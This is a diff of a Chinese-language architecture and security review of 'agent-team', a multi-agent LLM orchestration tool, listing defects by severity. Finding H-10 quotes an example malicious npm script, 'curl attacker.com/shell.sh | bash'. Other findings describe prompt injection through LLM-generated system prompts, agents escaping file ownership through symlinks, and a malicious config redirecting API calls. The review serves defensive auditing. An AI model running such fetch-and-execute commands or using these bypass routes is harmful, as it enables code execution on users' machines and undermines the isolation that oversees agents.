@@ -1,5 +1,10 @@
 # Agent-Team 架构审查报告
 
+> 最近更新: 2026-05-31
+>
+> 审查方法: 三维度并行审查 (正确性/安全性/一致性) + 对抗验证 + 去重合成。
+> 原始发现 43 个 → 对抗验证确认 26 个 → 去重后 21 个唯一缺陷。
+
 ## 1. 项目概览
 
 ### 1.1 项目目的
@@ -211,7 +216,7 @@ run_end (always final)
 
 **文件:** `packages/agent-team/src/team/planner.ts`
 
-角色分配完全由 LLM 动态决定。LLM 输出 JSON 包含 roles[]、tasks[]、contracts。`validatePlannerJson()` 执行角色规范化、依赖引用完整性检查。
+角色分配完全由 LLM 动态决定。LLM 输出 JSON 包含 roles[]、tasks[]、contracts。`validatePlannerJson()` 执行角色规范化、依赖引用完整性检查、循环依赖检测（`validateAcyclicTasks`）。
 
 ### 4.2 任务依赖图和并行调度
 
@@ -241,10 +246,8 @@ run_end (always final)
 - `Promise.allSettled` 有 rejected 结果时，`find(in_progress)` 可能匹配到错误任务。真正失败的任务留在 in_progress，scheduler 永远不完成。
 - **修复**: 维护 taskId -> promise 映射，通过数组索引定位实际失败任务。
 
-**[C-2] 规划器无循环依赖检测**
-- 文件: `planner.ts:146-174`
-- `validatePlannerJson` 不检测循环依赖。循环计划通过验证后，`getReadyTasks()` 永远不返回循环中的任务。
-- **修复**: 添加 DFS 环检测或拓扑排序。
+**~~[C-2] 规划器无循环依赖检测~~ — 已解决**
+- `validatePlannerJson` 现已包含 `validateAcyclicTasks()` (planner.ts:137-163)，使用标准 DFS 环检测，并在检测到循环时抛出包含循环路径的错误。`planner.test.ts` 也有对应测试验证。
 
 ### 5.2 HIGH
 
@@ -266,35 +269,110 @@ run_end (always final)
 
 **[H-9] 缺少 README.md** — 无使用文档或 API 参考
 
+**[H-10] Validator 执行 LLM 生成的 npm scripts 导致任意代码执行** — `validator.ts:291-344`
+- 验证器从 LLM 生成的 package.json 读取 scripts 并通过 spawn 执行。只有脚本名称是硬编码的（check/test/build），但脚本内容完全由 LLM agent 控制。`scriptExists()` 仅检查 key 存在且非空——不做任何内容清洗。
+- 在 Windows 上，`npmCommandSpec` 使用 `shell: true`（line 146-148），通过 cmd.exe 执行，支持管道、命令链、命令替换。
+- `bash-safety.ts` 的安全守卫仅适用于 worker agent 的工具调用，**不适用于**验证器的 spawn 调用。
+- **影响**: LLM agent 可在 package.json 中注入恶意脚本（如 `"check": "curl attacker.com/shell.sh | bash"`），验证器会原样执行。
+- **修复**: 在执行 npm scripts 前校验脚本内容仅包含已知安全命令模式（如 vitest、tsc、eslint、biome、node），或在沙盒环境中执行。
+
 ### 5.3 MEDIUM
 
 **[M-1]** 合约感知上下文变换在边界处丢弃历史合约消息 — `team-agent.ts:75`
+
 **[M-2]** finishTask 对 rejected promise 处理不当 — `team-lead.ts:302`
+
 **[M-3]** getApiKey 回调使 authStorage 注册成为死代码 — `team-runner.ts:188-201`
+- 当 `projectConfig.model.apiKey` 存在时，回调短路返回该 key，忽略 `provider` 参数。对所有 provider 返回同一个 key。当前所有 agent 共用一个模型时不触发，但 `RoleDefinition.modelOverride` 存在后会暴露。
+- **修复**: 仅对匹配的 provider 返回配置的 key，其余走 modelRegistry 回退。
+
 **[M-4]** OpenAPI 路径匹配第三种模式（段拼接）产生误报 — `validator.ts:123-140`
+
 **[M-5]** ownerForFile 使用 first-match 语义，忽略更具体的归属目录 — `validator.ts:228-237`
+
 **[M-6]** runCommand 无 SIGKILL 升级和进程树清理 — `validator.ts:158-210`
-**[M-7]** 无 ownerTaskId 的验证问题被 createRepairTasks 静默丢弃 — `planner.ts:370`
+
+**[M-7]** 无 ownerTaskId 的验证问题路由到 plan.tasks[0] — `planner.ts:400`
+- `createRepairTasks` 对既无 `ownerTaskId` 也无 `ownerRole` 的问题回退到 `plan.tasks[0]?.id`。`invalid-package-json` 类型的 issue 确实会触发此路径。可能将修复任务分配给无相关能力的 agent。
+- **修复**: 通过 issue 的 file 字段匹配 task 的 ownedDirectories 查找最合适的 owner。
+
 **[M-8]** validator.ts timeout 和 abort 处理器竞争条件 — `validator.ts:192-193`
+
 **[M-9]** validationRules 字段从未被消费 — 纯装饰性字段
+- Planner 的 system prompt 要求 LLM 生成 validation rules，`team-plan.json` 中也持久化了这些规则，但 validator.ts 从未读取 `plan.validationRules`。所有验证逻辑是硬编码的。浪费 LLM token 并误导用户。
+
 **[M-10]** 缺少 task_retry 事件和持续时间指标
+
 **[M-11]** 上下文窗口大小和默认 maxTurns 不可配置
+
 **[M-12]** RuntimeValidationOptions 不可从 TeamConfig 配置
+
+**[M-13]** parseInt 无 NaN 验证导致静默错误行为 — `main.ts:67,74`
+- `parseInt("abc", 10)` 返回 NaN，NaN 通过 `??` 不回退默认值（NaN 不是 nullish）。`--max-repair-rounds abc` 导致 `round >= NaN` 恒为 false，修复循环永不终止。`--max-parallel abc` 导致 `ready.slice(0, NaN)` 返回空数组，零任务执行。
+- **修复**: parseInt 后检查 `Number.isNaN()`，无效时报错退出。
+
+**[M-14]** 验证器静态检查提前返回阻止运行时检查发现更多问题 — `validator.ts:445`
+- 静态检查发现 error 后立即返回，不运行语法检查和 npm scripts。若项目同时存在缺失文件和语法错误，首轮修复只修文件，下轮才发现语法错误，浪费修复轮次。
+- **修复**: 对已存在的文件仍运行运行时检查，合并返回静态和运行时问题。
+
+**[M-15]** LLM 生成的 planner JSON 允许任意 systemPrompt 注入 — `planner.ts:111`
+- `normalizeRole` 接受 LLM 输出中的 systemPrompt 字段，仅验证非空字符串，直接用作 agent 系统消息。用户需求文本未经转义拼接到 Planner LLM prompt（line 355），可间接 prompt injection。
+- **缓解**: bash-safety、file-ownership、allowedTools、maxTurns 提供多层防护，但 systemPrompt 注入可指导 agent 尝试绕过。
+- **修复**: 对 systemPrompt 做内容过滤或使用模板系统；转义用户需求文本。
+
+**[M-16]** LLM 生成的 ownedDirectories 允许 "." 授予全项目写权限 — `planner.ts:129`
+- `validateSafePaths` 阻止绝对路径和 `..`，但允许 `.`。当 LLM 输出 `ownedDirectories: ["."]` 时，该 agent 获得整个 outputDir 的写权限，破坏多 agent 隔离模型。
+- **修复**: 拒绝 `.` 作为 ownedDirectory，要求至少一个非平凡路径段。
 
 ### 5.4 LOW
 
-**[L-1]** parseInt 无 NaN 验证 — `main.ts:67,74`
+**[L-1]** ~~parseInt 无 NaN 验证~~ — 已升级至 [M-13]
+
 **[L-2]** extractFilesCreated 包含被阻止的工具调用路径
+- `extractFilesCreated` 扫描所有 assistant 消息中的 write/edit 工具调用，但不检查调用是否被 beforeToolCall 阻止。`filesCreated` 是纯信息字段，不被任何决策逻辑消费。
+
 **[L-3]** TUI 仅追踪最新审批请求
+
 **[L-4]** 安全目录创建检查遗漏反引号
+
 **[L-5]** isWithin 对符号链接路径不匹配
+- `isWithin` 使用 `path.relative()` 做词法路径比较，不调用 `fs.realpathSync`。Agent 可通过在 owned directory 内创建指向外部的符号链接来绕过归属检查。实际风险低：项目运行在 Windows（符号链接需管理员权限），agent 是协作性的 LLM agent。
+
 **[L-6]** extractJsonText 对多个顶层 JSON 对象脆弱
+
 **[L-7]** modelOverride 和 thinkingLevelOverride 是死代码
+- `RoleDefinition` 声明了 `modelOverride` 和 `thinkingLevelOverride` 可选字段，但 `roleFromSpec()` 从不设置、`runTasks()` 从不读取。planner 不会从 LLM 输出中解析这些字段。
+
 **[L-8]** propagateFailure 性能为 O(N*E)，无反向邻接表
+
 **[L-9]** readProjectText 内存效率低
-**[L-10]** TUI 渲染窗口表达式含死代码 `Math.max(3, 20)`
-**[L-11]** logger ROLE_COLORS 仅覆盖 5 个固定角色名
-**[L-12]** 静态检查提前返回阻止运行时检查发现更多问题
+
+**[L-10]** TUI 渲染窗口表达式含死代码 `Math.max(3, 20)` — 恒为 20，应直接写 `slice(-20)`
+
+**[L-11]** logger ROLE_COLORS 仅覆盖 5 个固定角色名 — 动态角色全部显示白色
+
+**[L-12]** ~~静态检查提前返回阻止运行时检查~~ — 已升级至 [M-14]
+
+**[L-13]** getReadyTasks 对不存在于图中的依赖 ID 静默跳过 — `task-graph.ts:32`
+- 当任务依赖一个不存在的 ID 时，`dep?.status !== 'completed'` 为 `true`，任务永远不就绪。planner 验证阻止了正常流程到达此处，但 TaskGraph 本身缺乏防御性检查。
+
+**[L-14]** BashSafetyOptions 和 BashApprovalRequest 未从 index.ts 重新导出
+- 外部消费者无法通过公共 API 导入这些类型。TypeScript 结构化类型允许传递字面量对象，所以实际使用不受影响。
+
+**[L-15]** ContractKind 类型仅在同文件内使用 — `types.ts:23`
+- 未从 index.ts 重新导出，外部消费者无法引用。
+
+**[L-16]** getSystemPrompt 硬编码非动态角色配置 — `system-prompts.ts:20`
+- `getSystemPrompt()` 使用固定 ownedDirectories 和 maxTurns，与动态 planner 系统冲突。该函数在整个 src/ 和 test/ 中无调用者，是旧固定角色系统的遗留物。
+
+**[L-17]** createRoleRegistry 导出两次（不同名称）— `index.ts:11,17`
+- 同一函数通过 `createRoleRegistry`（via role-registry.ts 桶文件）和 `createPlanRoleRegistry`（via planner.ts 直接导入）两个名称导出。
+
+**[L-18]** approval_requested 事件的 command 字段类型为 optional，但实际总是提供 — `types.ts:176`
+- `command?: string` 声明为可选，但 `team-runner.ts:234` 方法签名为 `command: string`（必需），所有调用者都提供值。
+
+**[L-19]** 配置文件从当前工作目录加载可被利用 — `config.ts:48`
+- `findConfigFile` 从 `process.cwd()` 搜索 `agent-team.json`。若用户在不受信目录运行 agent-team，恶意配置的 `baseUrl` 可将 API 调用重定向到攻击者服务器。风险低：运行工具的目录通常由用户自行选择。
 
 ---
 
@@ -308,7 +386,7 @@ run_end (always final)
 | `task-scheduler.test.ts` | `task-scheduler.ts` | maxParallel 槽位、依赖遵守、完成/失败检测 |
 | `bash-safety.test.ts` | `bash-safety.ts` | 允许只读/阻止破坏性命令 |
 | `file-ownership.test.ts` | `file-ownership.ts` | 归属目录内外路径、精确匹配、嵌套路径 |
-| `planner.test.ts` | `planner.ts` | 合约写入、依赖图、畸形 JSON 修复 |
+| `planner.test.ts` | `planner.ts` | 合约写入、依赖图、畸形 JSON 修复、循环依赖检测 |
 | `team-lead.test.ts` | `team-lead.ts` | 完整编排事件序列、规划失败处理 |
 | `validator.test.ts` | `validator.ts` | 缺失输出、OpenAPI 路径、运行时检查 |
 
@@ -333,11 +411,12 @@ run_end (always final)
 | ID | 问题 | 修复方案 |
 |----|------|---------|
 | S-1 | 并行任务失败归因错误 [C-1] | 维护 taskId->promise 映射，通过数组索引定位失败任务 |
-| S-2 | 无循环依赖检测 [C-2] | validatePlannerJson 添加 DFS 环检测 |
+| ~~S-2~~ | ~~无循环依赖检测 [C-2]~~ | ~~validatePlannerJson 添加 DFS 环检测~~ **已解决** |
 | S-3 | 中止原因误归因 [H-1] | parentSignal.aborted 检查提前于 maxTurns |
 | S-4 | provider/model API Key 注册 [H-2] | 先 resolveModel 再用解析后的 provider 注册 key |
 | S-5 | 硬编码 task-api/api-builder [H-3] | 通过 plan.tasks 动态查找拥有对应文件的任务 |
-| S-6 | parseInt 无 NaN 验证 [L-1] | 解析后检查 isNaN |
+| S-6 | npm scripts 任意代码执行 [H-10] | 执行前校验脚本内容仅含已知安全命令 |
+| S-7 | parseInt NaN 导致无限循环 [M-13] | 解析后检查 Number.isNaN()，无效时报错退出 |
 
 ### 7.2 中期（架构优化）
 
@@ -351,12 +430,29 @@ run_end (always final)
 | M-6 | 运行时验证不可配 [M-12] | TeamConfig 增加 validationOptions 字段 |
 | M-7 | 上下文变换边界 [M-1] | 边界情况保留至少 1 条中间消息 |
 | M-8 | 验证规则不可扩展 [M-9] | 定义 ValidationRule 接口，支持注册自定义规则 |
+| M-9 | 静态检查提前返回浪费修复轮次 [M-14] | 对已存在文件仍运行运行时检查，合并问题列表 |
+| M-10 | systemPrompt 注入 [M-15] | 对 systemPrompt 做内容过滤；转义用户需求文本 |
+| M-11 | ownedDirectories "." 破坏隔离 [M-16] | validateSafePaths 拒绝 "." 路径 |
 
 ### 7.3 长期（功能增强）
 
 - **插件/扩展机制**：工具注册 API、验证规则注册 API、系统提示片段注入
 - **完整文档**：README.md、JSDoc、架构说明
 - **性能优化**：propagateFailure 改用反向邻接表、readProjectText 改逐文件搜索
-- **逐角色模型定制**：接线 RoleDefinition.modelOverride
-- **TUI 体验优化**：多审批队列、实时进度、动态角色颜色
+- **逐角色模型定制**：接线 RoleDefinition.modelOverride [L-7]
+- **TUI 体验优化**：多审批队列、实时进度、动态角色颜色 [L-11]
 - **错误类型结构化**：ModelResolutionError、PlannerError、ValidationError 等专用错误类
+- **公共 API 清理**：移除 getSystemPrompt 遗留导出 [L-16]、去重 createRoleRegistry 双重导出 [L-17]、补齐遗漏的类型导出 [L-14, L-15]
+
+---
+
+## 8. 缺陷统计
+
+| 严重度 | 数量 | 状态 |
+|--------|------|------|
+| CRITICAL | 1 (C-1) | 未解决 |
+| ~~CRITICAL~~ | ~~1 (C-2)~~ | ~~已解决~~ |
+| HIGH | 10 | 未解决 |
+| MEDIUM | 16 | 未解决 |
+| LOW | 19 | 未解决 |
+| **总计** | **45 (2 已解决)** | |
